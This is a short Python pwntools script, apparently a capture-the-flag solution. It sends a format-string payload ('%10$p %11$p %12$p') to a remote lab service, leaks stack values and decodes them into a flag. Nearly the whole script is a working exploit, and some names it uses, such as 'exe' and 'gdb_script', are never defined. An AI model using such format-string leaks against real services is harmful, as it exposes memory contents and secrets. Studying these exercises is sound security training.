#!/usr/bin/env python3

from pwn import *


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("10.10.138.131", 1337)

    return r


def main():
    r = conn()
    
    payload = b"%10$p %11$p %12$p"

	
    r.sendline(payload)
    r.recv()
    leak = r.recvuntil(b". Was version").decode().split()
    
    hexed_flag = [leak[2].replace("0x", ""), leak[3].replace("0x",""),leak[4].replace(".","").replace("0x","")[1:3]]
    
    flag = ''
    for flag_part in hexed_flag:
        unhexed = ''
        for i in range(0, len(flag_part), 2):
            unhexed += chr(int("0x"+flag_part[i:i+2], 16))
        flag += unhexed[::-1]
            

    log.info(f"Flag is {flag}")


if __name__ == "__main__":
    main()
